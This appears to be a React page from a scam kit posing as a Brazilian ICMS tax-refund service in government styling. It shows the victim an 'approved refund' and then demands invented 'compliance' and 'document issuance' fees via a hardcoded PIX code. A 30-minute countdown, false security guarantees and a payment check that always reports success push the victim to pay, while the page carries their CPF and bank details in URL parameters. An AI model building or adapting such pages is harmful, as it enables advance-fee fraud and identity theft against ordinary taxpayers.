import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Loader2, Clock, DollarSign, CreditCard, Copy, FileText, CheckCircle } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";
import ScrollToTop from "@/components/ScrollToTop";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

// Componente de código PIX fictício para simulação
const PixQRCode = ({ valor, onCopy }: { valor: string, onCopy: () => void }) => {
  return (
    <div className="flex flex-col items-center justify-center p-4 bg-white rounded-lg border border-gray-200">
      <div className="mb-3 w-44 h-44 bg-gray-100 rounded-lg flex items-center justify-center">
        <svg
          width="160"
          height="160"
          viewBox="0 0 160 160"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="text-black"
        >
          <rect x="10" y="10" width="140" height="140" rx="4" fill="white" stroke="black" strokeWidth="2" />
          <rect x="30" y="30" width="100" height="100" fill="white" />
          <rect x="40" y="40" width="10" height="10" fill="black" />
          <rect x="60" y="40" width="10" height="10" fill="black" />
          <rect x="80" y="40" width="10" height="10" fill="black" />
          <rect x="110" y="40" width="10" height="10" fill="black" />
          <rect x="40" y="60" width="10" height="10" fill="black" />
          <rect x="60" y="60" width="10" height="10" fill="black" />
          <rect x="90" y="60" width="10" height="10" fill="black" />
          <rect x="110" y="60" width="10" height="10" fill="black" />
          <rect x="40" y="80" width="10" height="10" fill="black" />
          <rect x="60" y="80" width="10" height="10" fill="black" />
          <rect x="80" y="80" width="10" height="10" fill="black" />
          <rect x="100" y="80" width="10" height="10" fill="black" />
          <rect x="40" y="100" width="10" height="10" fill="black" />
          <rect x="70" y="100" width="10" height="10" fill="black" />
          <rect x="90" y="100" width="10" height="10" fill="black" />
          <rect x="110" y="100" width="10" height="10" fill="black" />
        </svg>
      </div>
      <div className="text-sm font-medium text-center text-gray-700 mb-2">PIX Copia e Cola</div>
      <div className="relative w-full">
        <div className="bg-gray-100 rounded p-2 pr-10 text-xs text-gray-800 break-all select-all overflow-hidden text-center">
          00020126580014BR.GOV.BCB.PIX0136f5f35a77-6b45-4c23-9cB0-a6fea41e5268520400005303986540{valor.replace(/[^\d]/g, '')}6009SAO PAULO62070503***6304D34B
        </div>
        <button 
          onClick={onCopy}
          className="absolute right-2 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
        >
          <Copy size={16} />
        </button>
      </div>
    </div>
  );
};

export default function TaxaFinal() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Estado de loading para simular o processamento do pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'completed'>('pending');
  const [tempoRestante, setTempoRestante] = useState(1800); // 30 minutos em segundos
  const [progress, setProgress] = useState(0);
  
  // Valores das taxas de conformidade
  const [valorTaxaConformidade, setValorTaxaConformidade] = useState(118.40);
  const [valorTaxaEmissao, setValorTaxaEmissao] = useState(48.6);
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  
  // Obter parâmetros da URL
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Obter valores das taxas
    const taxaConformidade = urlParams.get('valorTaxaConformidade');
    if (taxaConformidade) {
      setValorTaxaConformidade(parseFloat(taxaConformidade));
    }
    
    const taxaEmissao = urlParams.get('valorTaxaEmissao');
    if (taxaEmissao) {
      setValorTaxaEmissao(parseFloat(taxaEmissao));
    }
    
    // Definir protocolo
    const protocoloParam = urlParams.get('protocolo');
    if (protocoloParam) {
      setProtocolo(protocoloParam);
    } else {
      const cpf = urlParams.get('cpf') || "";
      if (cpf) {
        setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
      }
    }
    
    // Definir data atual
    const dataHoje = new Date();
    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
    
    // Definir data do pagamento da primeira taxa
    const dataPagamentoParam = urlParams.get('dataPagamento');
    if (dataPagamentoParam) {
      setDataPagamento(formatarData(dataPagamentoParam));
    } else {
      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }));
    }
    
    // Preencher dados da solicitação
    setDadosSolicitacao({
      nome: urlParams.get('nome') || "",
      cpf: urlParams.get('cpf') || "",
      valor: urlParams.get('valor') || "0",
      companhia: urlParams.get('companhia') || "",
      estado: urlParams.get('estado') || "",
      dataNascimento: urlParams.get('nasc') || "",
      email: urlParams.get('email') || "",
      telefone: urlParams.get('telefone') || "",
      agencia: urlParams.get('agencia') || "",
      conta: urlParams.get('conta') || "",
      pagamentoId: urlParams.get('pagamentoId') || ""
    });
  }, []);
  
  // Formato para exibição de tempo restante
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segundosRestantes = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundosRestantes.toString().padStart(2, '0')}`;
  };
  
  // Efeito para o contador regressivo
  useEffect(() => {
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento das taxas expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerInterval);
    };
  }, []);
  
  // Função para simular verificação do pagamento
  const verificarStatusPagamento = async () => {
    if (isLoading || paymentStatus === 'completed') return;
    
    setIsLoading(true);
    
    // Simular processo de verificação
    setPaymentStatus('processing');
    setProgress(30);
    
    // Simular verificação com atualizações graduais de progresso
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 800);
    
    // Simular resposta positiva após 3 segundos
    setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setPaymentStatus('completed');
      setIsLoading(false);
      
      // Exibir mensagem de sucesso
      toast({
        title: "Pagamento confirmado!",
        description: "Suas taxas complementares foram pagas com sucesso.",
        variant: "success",
      });
      
      // Redirecionar para página de sucesso
      setTimeout(() => {
        // Criar parâmetros de URL para a página de sucesso
        const params = new URLSearchParams();
        
        Object.entries(dadosSolicitacao).forEach(([key, value]) => {
          params.append(key, value);
        });
        
        params.append('protocolo', protocolo);
        params.append('taxasCompletas', 'true');
        params.append('dataPagamentoFinal', new Date().toISOString());
        params.append('valorTaxaConformidade', valorTaxaConformidade.toString());
        params.append('valorTaxaEmissao', valorTaxaEmissao.toString());
        
        setLocation(`/sucesso?${params.toString()}`);
      }, 1500);
    }, 3000);
  };
  
  // Função para copiar o código PIX
  const copiarCodigoPix = () => {
    const codigoPix = "00020126580014BR.GOV.BCB.PIX0136f5f35a77-6b45-4c23-9cB0-a6fea41e5268520400005303986540166600009SAO PAULO62070503***6304D34B";
    
    navigator.clipboard.writeText(codigoPix)
      .then(() => {
        toast({
          title: "Código PIX copiado!",
          description: "Cole o código no aplicativo do seu banco para pagar.",
          variant: "success",
        });
      })
      .catch(() => {
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o código automaticamente. Selecione-o manualmente.",
          variant: "destructive",
        });
      });
  };
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaConformidadeFormatado = formatarMoeda(valorTaxaConformidade);
  const valorTaxaEmissaoFormatado = formatarMoeda(valorTaxaEmissao);
  const valorTotalTaxasFormatado = formatarMoeda(valorTaxaConformidade + valorTaxaEmissao);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Valor aprovado:</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <Clock size={12} className="mr-1" />
                  <span>Pagamento da TRE: <span className="font-medium">{dataPagamento}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Alerta de status */}
          <div className="mb-6">
            <Alert className="border-amber-500 bg-amber-50">
              <AlertTriangle className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">Etapa Final: Pagamento das Taxas Complementares</AlertTitle>
              <AlertDescription className="text-amber-700">
                Realize o pagamento das taxas complementares para concluir o processo de restituição.
                O valor será depositado em sua conta após a confirmação.
              </AlertDescription>
            </Alert>
          </div>
          
          {/* Informações de pagamento */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <CreditCard className="h-4 w-4" />
            </div>
            PAGAMENTO DAS TAXAS COMPLEMENTARES
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            {paymentStatus === 'completed' ? (
              <div className="p-5 bg-green-50 border border-green-200 rounded-lg text-center">
                <div className="flex justify-center mb-3">
                  <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="h-8 w-8 text-white" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-green-800 mb-2">Pagamento Confirmado!</h3>
                <p className="text-green-700 mb-4">
                  Suas taxas complementares no valor de {valorTotalTaxasFormatado} foram pagas com sucesso.
                  O valor da sua restituição será depositado em breve.
                </p>
                <div className="p-3 bg-white rounded-lg border border-green-200 inline-block">
                  <p className="font-medium text-gray-800">Processando sua restituição...</p>
                  <p className="text-sm text-gray-600">Você será redirecionado em instantes</p>
                </div>
              </div>
            ) : paymentStatus === 'processing' ? (
              <div className="p-5 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex justify-center mb-3">
                  <div className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center">
                    <Loader2 className="h-8 w-8 text-white animate-spin" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-blue-800 mb-2 text-center">Verificando Pagamento</h3>
                <p className="text-blue-700 mb-4 text-center">
                  Estamos processando seu pagamento. Por favor, aguarde enquanto verificamos a transação.
                </p>
                <div className="mb-2">
                  <Progress value={progress} className="h-2" />
                </div>
                <p className="text-xs text-blue-600 text-center">{progress}% concluído</p>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="text-center">
                  <h3 className="text-lg font-bold text-gray-800 mb-2">Total a pagar: {valorTotalTaxasFormatado}</h3>
                  <p className="text-sm text-gray-600 mb-4">
                    Efetue o pagamento em até <span className="font-bold text-red-600">{formatarTempo(tempoRestante)}</span> para 
                    garantir sua restituição de <strong>{valorRestituicaoFormatado}</strong>
                  </p>
                  
                  <div className="border-t border-gray-200 pt-4">
                    <Tabs defaultValue="qrcode" className="w-full">
                      <TabsList className="w-full mb-6 bg-gray-100 p-1 rounded-lg">
                        <TabsTrigger value="qrcode" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                          <div className="flex items-center justify-center gap-2 py-1">
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
                            </svg>
                            QR Code PIX
                          </div>
                        </TabsTrigger>
                        <TabsTrigger value="copiacola" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                          <div className="flex items-center justify-center gap-2 py-1">
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                            Pix Copia e Cola
                          </div>
                        </TabsTrigger>
                      </TabsList>
                      
                      <TabsContent value="qrcode" className="flex justify-center">
                        <PixQRCode 
                          valor={valorTaxaConformidade + valorTaxaEmissao + ""} 
                          onCopy={copiarCodigoPix} 
                        />
                      </TabsContent>
                      
                      <TabsContent value="copiacola">
                        <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
                          <h4 className="font-medium text-gray-800 mb-2">Pix Copia e Cola</h4>
                          <div className="relative mb-3">
                            <div className="bg-white rounded p-3 pr-10 text-xs text-gray-800 break-all select-all overflow-hidden border border-gray-300">
                              00020126580014BR.GOV.BCB.PIX0136f5f35a77-6b45-4c23-9cB0-a6fea41e5268520400005303986540166600009SAO PAULO62070503***6304D34B
                            </div>
                            <button 
                              onClick={copiarCodigoPix}
                              className="absolute right-2 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
                            >
                              <Copy size={16} />
                            </button>
                          </div>
                          <div className="text-xs text-gray-600">
                            1. Copie o código acima<br />
                            2. Abra o aplicativo do seu banco<br />
                            3. Escolha a opção "Pix Copia e Cola"<br />
                            4. Cole o código e confirme o pagamento
                          </div>
                        </div>
                      </TabsContent>
                    </Tabs>
                  </div>
                  
                  <div className="mt-6">
                    <Button 
                      onClick={verificarStatusPagamento}
                      disabled={isLoading}
                      className="w-full font-bold py-6 text-lg bg-green-600 hover:bg-green-700 text-white shadow-md"
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                          Verificando pagamento...
                        </div>
                      ) : (
                        <div className="flex items-center justify-center">
                          <CheckCircle className="mr-2 h-6 w-6" />
                          Já fiz o pagamento
                        </div>
                      )}
                    </Button>
                    
                    <div className="bg-amber-50 border border-amber-200 rounded-md p-3 mt-4">
                      <div className="flex items-center">
                        <AlertTriangle className="h-5 w-5 text-amber-600 mr-2 flex-shrink-0" />
                        <p className="text-sm text-amber-800">
                          Importante: Após o pagamento, clique em "Já fiz o pagamento" para verificar 
                          o status da transação e liberar sua restituição.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* Detalhamento das taxas */}
                <div className="border-t border-gray-200 pt-4 mt-6">
                  <h4 className="font-semibold text-gray-800 mb-3">Detalhamento do pagamento:</h4>
                  <div className="bg-gray-50 p-3 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-700">Taxa de Conformidade Nacional:</span>
                      <span className="font-medium text-gray-800">{valorTaxaConformidadeFormatado}</span>
                    </div>
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-gray-700">Taxa de Emissão de Documento Final:</span>
                      <span className="font-medium text-gray-800">{valorTaxaEmissaoFormatado}</span>
                    </div>
                    <div className="flex justify-between items-center pt-2 border-t border-gray-300">
                      <span className="font-bold text-gray-800">Total:</span>
                      <span className="font-bold text-green-700 text-lg">{valorTotalTaxasFormatado}</span>
                    </div>
                  </div>
                </div>
                
                {/* Instruções de pagamento */}
                <div className="border-t border-gray-200 pt-4 mt-6">
                  <h4 className="font-semibold text-gray-800 mb-3">Como pagar:</h4>
                  <div className="space-y-3">
                    <div className="flex items-start">
                      <span className="flex-shrink-0 w-6 h-6 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center mr-2 text-xs font-bold">1</span>
                      <p className="text-sm text-gray-700">Abra o aplicativo do seu banco ou instituição financeira.</p>
                    </div>
                    <div className="flex items-start">
                      <span className="flex-shrink-0 w-6 h-6 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center mr-2 text-xs font-bold">2</span>
                      <p className="text-sm text-gray-700">Escolha a opção de pagamento via Pix (QR Code ou Pix Copia e Cola).</p>
                    </div>
                    <div className="flex items-start">
                      <span className="flex-shrink-0 w-6 h-6 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center mr-2 text-xs font-bold">3</span>
                      <p className="text-sm text-gray-700">Escaneie o QR Code ou cole o código Pix fornecido acima.</p>
                    </div>
                    <div className="flex items-start">
                      <span className="flex-shrink-0 w-6 h-6 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center mr-2 text-xs font-bold">4</span>
                      <p className="text-sm text-gray-700">Confirme os dados e o valor de {valorTotalTaxasFormatado} e finalize o pagamento.</p>
                    </div>
                    <div className="flex items-start">
                      <span className="flex-shrink-0 w-6 h-6 bg-blue-100 text-blue-700 rounded-full flex items-center justify-center mr-2 text-xs font-bold">5</span>
                      <p className="text-sm text-gray-700">Após o pagamento, clique no botão "Já fiz o pagamento" para verificar o status.</p>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
          
          {/* Seção de Garantia de Segurança */}
          <div className="mb-6">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Pagamento seguro via PIX</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Proteção de dados</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Transação monitorada</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}